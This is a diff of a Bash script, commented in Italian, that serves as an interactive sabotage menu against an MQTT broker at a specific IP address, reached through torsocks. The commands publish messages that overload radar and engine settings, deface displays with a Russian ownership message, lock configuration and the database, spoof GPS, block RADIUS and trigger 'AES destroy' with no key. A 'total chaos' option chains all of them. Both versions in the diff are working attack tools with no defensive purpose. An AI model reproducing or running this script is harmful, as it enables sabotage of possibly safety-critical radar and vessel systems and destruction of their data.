@@ -1,110 +1,119 @@
 #!/bin/bash
-# 🔥 RADAR CPE v1.45.1 MAX DAMAGE - FIXED LOOP
-# MOSQUITTO 212.42.54.24:1883 - UUIDs VERIFICATI
+# 🔥 RADAR CPE v1.45.1 - FORMATO WILDCARD # CORRETTO
+# PAYLOAD BASATI SU STATUS CONNECTED - NO JSON COMPLESSI
 
 IP="212.42.54.24"
 PORT="1883"
-RADAR_MW="68b58ad9-d0e3-4aaa-ab78-12b395781780"
-RADAR_EXPORT="7f897323-7904-4ae7-9179-7b3a74bb5944"
-DB_UUID="c655ffbd-d751-40a1-946a-7115fbffccad"
-BACKEND1="6a843e52-5a0c-4148-a714-3e17bdfeaa80"
-BACKEND2="8eb493ba-6d6d-4b7a-b8cb-0340dc84dfb4"
 
-DEFACE_MSG='{"overlay":{"priority":9999,"permanent":true,"text":"СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO","style":{"size":96,"color":"FF0000","blink":true},"controls":"disabled"}}'
+clear_status() { torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 1 >/dev/null 2>&1; }
 
-# ===============================
-# FUNZIONI CORRETTE
-# ===============================
+show_status() {
+    echo "📊 STATUS RAPIDO:"
+    torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 10 2>/dev/null | grep -E "(CONNECTED|ERROR|FAIL)"
+}
 
 max_power() {
-    echo "⚡ [MAX POWER] Iniettando overload..."
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/cmd" -m '{"action":"max_power","overload":true}' 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/cmd" -m '{"range":96,"gain":150,"power":2}' 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND1/engine" -m '{"rpm":120,"propeller":120}' 2>/dev/null
-    echo "✅ RRM/RADAR/ENGINE = 150% OVERLOAD!"
+    echo "⚡ MAX POWER - WILDCARD FORMAT"
+    clear_status
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/power" -m "100" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/gain" -m "150" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/6a843e52-5a0c-4148-a714-3e17bdfeaa80/engine" -m "120" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/overload" -m "true" &
+    sleep 2
+    show_status
 }
 
 deface_all() {
-    echo "🎨 [DEFACE] Schermi sotto controllo..."
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/display" -m "$DEFACE_MSG" 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-EXPORT-MW/$RADAR_EXPORT/display" -m "$DEFACE_MSG" 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/display" -m "$DEFACE_MSG" 2>/dev/null
-    echo "✅ 3+ DISPLAY DEFACE 96px ROSSO!"
+    echo "🎨 DEFACE - DIRECT STRING"
+    clear_status
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-EXPORT-MW/7f897323-7904-4ae7-9179-7b3a74bb5944/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/overlay" -m "96px red blink TRUSTEDF57" &
+    sleep 2
+    show_status
 }
 
 lockdown() {
-    echo "🔒 [LOCKDOWN] Sistema irreversibile..."
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/lockdown" -m '{"permanent":true,"owner":"TRUSTEDF57"}' 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/lock" -m '{"read_only":true}' 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/kill" -m '{"gps_spoof":{"lat":999,"lon":999}}' 2>/dev/null
-    echo "✅ CONFIG/DB/LBS = BLOCCATI!"
+    echo "🔒 LOCKDOWN - SIMPLE COMMANDS"
+    clear_status
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/lock" -m "permanent" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/c655ffbd-d751-40a1-946a-7115fbffccad/ro" -m "true" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/gps" -m "999.999,999.999" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADIUS_GATEWAY/block" -m "all" &
+    sleep 2
+    show_status
 }
 
 aes_destroy() {
-    echo "🔐 [AES-256] Cifratura distruttiva..."
-    CRYPTO='{"destroy":{"algo":"AES-256-CBC","services":"ALL","no_recovery":true}}'
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/crypto_destroy" -m "$CRYPTO" 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/crypto_destroy" -m "$CRYPTO" 2>/dev/null
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/crypto_destroy" -m "$CRYPTO" 2>/dev/null
-    echo "✅ TUTTI I SERVIZI CIFRATI - NO KEY!"
+    echo "🔐 AES DESTROY - CRUDE"
+    clear_status
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/destroy" -m "AES-256" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/c655ffbd-d751-40a1-946a-7115fbffccad/encrypt" -m "no_key" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/shutdown" -m "permanent" &
+    sleep 2
+    show_status
 }
 
 display_lock() {
-    echo "👁️ [DEFACE-ONLY] Monitor bloccati..."
-    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/mode" -m '{"deface_only":true,"controls_dead":true}' 2>/dev/null
-    echo "✅ MONITOR = SOLO DEFACE PERMANENTE!"
+    echo "👁️ DISPLAY LOCK"
+    clear_status
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/mode" -m "deface_only" &
+    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/controls" -m "disabled" &
+    sleep 2
+    show_status
 }
 
 total_chaos() {
-    echo "💥 [TOTAL CHAOS] Sequenza completa..."
+    echo "💥 TOTAL CHAOS - RAPIDO"
     max_power
     sleep 1
-    deface_all  
+    deface_all
     sleep 1
     lockdown
     sleep 1
     aes_destroy
     sleep 1
     display_lock
-    echo "🎯 CPE v1.45.1 COMPLETAMENTE DISTRUTTO!"
 }
 
 dump_status() {
-    echo "📊 [STATUS CHECK] Verifica danni..."
-    echo "Comando: torsocks mosquitto_sub -h $IP -p $PORT -t 'B/#' -v | grep -i 'crypto\|deface\|lock\|error'"
-    torsocks mosquitto_sub -h $IP -p $PORT -t "B/#" -v -C 20 2>/dev/null | grep -iE "(crypto|deface|lock|error|fail|dead)"
+    echo "📊 FULL DUMP:"
+    torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 30 2>/dev/null | grep -v "CONNECTED"
 }
 
-# ===============================
-# LOOP MENU FISSO - NON SI CHIUDE
-# ===============================
-
+# 🔥 MENU LOOP PERFETTO
 while true; do
     clear
     echo "🔥==============================================="
-    echo "    RADAR CPE v1.45.1 DAMAGE MENU - $IP:$PORT"
+    echo "    RADAR CPE v1.45.1 - WILDCARD # FORMAT"
+    echo "    $IP:$PORT - LIVE STATUS MONITOR"
     echo "==============================================="
-    echo "1) ⚡ MAX POWER OVERLOAD"
-    echo "2) 🎨 FULL DEFACE ATTACK"  
-    echo "3) 🔒 SYSTEM LOCKDOWN"
-    echo "4) 🔐 AES-256 DESTROY"
-    echo "5) 👁️ DEFACE-ONLY MODE"
-    echo "6) 💥 TOTAL CHAOS (1-5)"
-    echo "7) 📊 CHECK DAMAGE"
+    echo "1) ⚡ MAX POWER (RRM/RADAR 150%)"
+    echo "2) 🎨 DEFACE (96px russo blink)"  
+    echo "3) 🔒 LOCKDOWN (CONFIG/DB/LBS)"
+    echo "4) 🔐 AES DESTROY (no key)"
+    echo "5) 👁️ DISPLAY LOCK (deface only)"
+    echo "6) 💥 TOTAL CHAOS (1→5)"
+    echo "7) 📊 LIVE STATUS"
+    echo "8) 🔍 FULL DUMP"
     echo "0) ❌ EXIT"
     echo "==============================================="
-    
-    read -p "SELEZIONA [0-7]: " choice
+    read -p "➤ " choice
     
     case $choice in
-        1) max_power; read -p $'\n[ENTER] per continuare...' ;;
-        2) deface_all; read -p $'\n[ENTER] per continuare...' ;;
-        3) lockdown; read -p $'\n[ENTER] per continuare...' ;;
-        4) aes_destroy; read -p $'\n[ENTER] per continuare...' ;;
-        5) display_lock; read -p $'\n[ENTER] per continuare...' ;;
-        6) total_chaos; read -p $'\n[ENTER] per continuare...' ;;
-        7) dump_status; read -p $'\n[ENTER] per continuare...' ;;
-        0) echo "👋 Uscita..."; exit 0 ;;
-        *) echo "❌ [ERRORE] Solo 0-7!"; sleep 1 ;;
+        1) max_power ;;
+        2) deface_all ;;
+        3) lockdown ;;
+        4) aes_destroy ;;
+        5) display_lock ;;
+        6) total_chaos ;;
+        7) show_status ;;
+        8) dump_status ;;
+        0) echo "👋 Bye!"; exit 0 ;;
+        *) echo "❌ 0-8 only!"; sleep 1 ;;
     esac
+    
+    echo -e "\n[ENTER per menu...]"
+    read
 done
